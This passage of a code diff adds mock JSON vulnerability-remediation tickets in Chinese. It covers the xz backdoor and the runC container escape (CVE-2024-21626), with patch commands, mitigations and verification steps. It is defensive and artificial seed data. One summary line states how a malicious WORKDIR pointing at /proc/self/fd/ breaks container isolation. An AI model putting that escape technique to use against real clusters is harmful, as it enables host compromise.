+          "stepNumber": 4,
+          "title": "執行金流 API 與 SSH 安全迴歸測試",
+          "detail": "呼叫測試腳本確認線上支付 Gateway 憑證鏈合法性及 SSH key 存取正常。",
+          "commandSnippet": "curl -Iv https://pay-gateway.bank.com.tw/health"
+        }
+      ],
+      "mitigationPlan": "如暫時無法立即重新重構 OS，請於 API Gateway 前端 WAF 啟用 SSH/TLS 封包深層檢查，並僅對內部堡壘機 (Bastion Host) 開放 22/tcp 埠。",
+      "verificationMethod": "1. 執行 `xz --version` 確保不為 5.6.0/5.6.1。\n2. 使用 OpenVAS / Nessus 進行自動掃描複查。\n3. 確認產出安全綠燈報告後簽核關閉工單。",
+      "createdAt": "2026-08-20T04:44:26.633Z",
+      "updatedAt": "2026-08-20T07:44:26.633Z"
+    },
+    {
+      "id": "tkt-2",
+      "ticketNo": "TKT-PRJ-CLOUD-2026-002",
+      "projectId": "prj-2",
+      "projectCode": "PRJ-CLOUD-CORE",
+      "projectName": "企業微服務與 K8s 雲原生平台",
+      "department": "資訊營運處 - 雲端架構組",
+      "title": "【高危處置】Docker Engine / runC 容器逃逸漏洞緊急防護工單",
+      "priority": "HIGH",
+      "status": "IN_PROGRESS",
+      "assigneeName": "張雅婷 (Cloud Architect Lead)",
+      "assigneeEmail": "yt.chang@company.internal",
+      "affectedProducts": [
+        "Docker Engine",
+        "Kubernetes"
+      ],
+      "cveCount": 1,
+      "cveList": [
+        {
+          "cveId": "CVE-2024-21626",
+          "title": "runC 容器逃逸與宿主機檔案系統越界存取漏洞 (Leaky Vessels)",
+          "cvss": 8.6,
+          "severity": "HIGH",
+          "cisaKev": true,
+          "productName": "Docker Engine"
+        }
+      ],
+      "slaHours": 72,
+      "slaDeadline": "2026-08-22T08:44:26.633Z",
+      "aiModelUsed": "gemini-3.6-flash",
+      "executiveSummary": "K8s 叢集 Worker Node 上的 runC 存在工作目錄 file descriptor 洩漏瑕疵。攻擊者若於 Pod 內建立惡意的 WORKDIR 指向 `/proc/self/fd/`，可在容器啟動時突破隔離層並寫入 Node 宿主機根檔案系統。",
+      "rootCauseAnalysis": "runc exec 或 runc create 期間，process 在套用 cgroup 與 pivot_root 前未關閉內部系統 FD，致使子處理程序保留了宿主機目錄 FD 控制權。",
+      "actionSteps": [
+        {
+          "stepNumber": 1,
+          "title": "驅逐 Pod 並切換 K8s 節點至 Maintenance Mode",
+          "detail": "對目標 Worker Node 執行 drain 指令以移轉 Pod：",
+          "commandSnippet": "kubectl drain node-01.k8s.internal --ignore-daemonsets --delete-emptydir-data"
+        },
+        {
+          "stepNumber": 2,
+          "title": "更新 containerd / runc 執行階段套件",
+          "detail": "將 runc 升級至 1.1.12+，containerd 升級至 1.6.28+：",
+          "commandSnippet": "sudo apt-get install --only-upgrade runc containerd.io\nrunc --version"
+        },
+        {
+          "stepNumber": 3,
+          "title": "解除 Cordon 並復原 K8s 節點調度",
+          "detail": "確認 runc 版本修補無誤後恢復節點運作：",
+          "commandSnippet": "kubectl uncordon node-01.k8s.internal"
+        }
+      ],
+      "mitigationPlan": "透過 AppArmor 或 Seccomp profile 阻斷 Pod 對 `/proc/self/fd/` 屬性之異動，並落實 PodSecurityPolicy 非 root 容器政策。",
+      "verificationMethod": "使用 Trivy 或 Falco 檢測 K8s 節點，驗證 runc 逃逸 PoC 測試無法寫入 /host-root 目錄。",
+      "createdAt": "2026-08-19T20:44:26.633Z",
+      "updatedAt": "2026-08-20T06:44:26.633Z"
+    }
+  ]
+}
